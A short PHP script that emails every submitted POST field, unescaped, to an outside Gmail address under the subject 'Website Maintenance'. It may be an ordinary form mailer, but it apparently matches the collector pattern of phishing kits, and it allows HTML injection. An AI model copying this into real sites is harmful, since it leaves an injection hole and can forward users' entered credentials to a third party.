<?php
include('config.php');
$message = "<html><body>";
if(isset($_POST)){
   foreach($_POST as $key => $val) {
       $message .= "<br>$key : $val";
   }
}
$message.="</body></html>";

$to = 'owchzzz@gmail.com';

$subject = 'Website Maintenance';

$headers = "From: likesplanet.com@gmail.com\r\n";
$headers .= "Reply-To: likesplanet.com@gmail.com\r\n";
$headers .= "CC: \r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

mail($to, $subject, $message, $headers);
?>

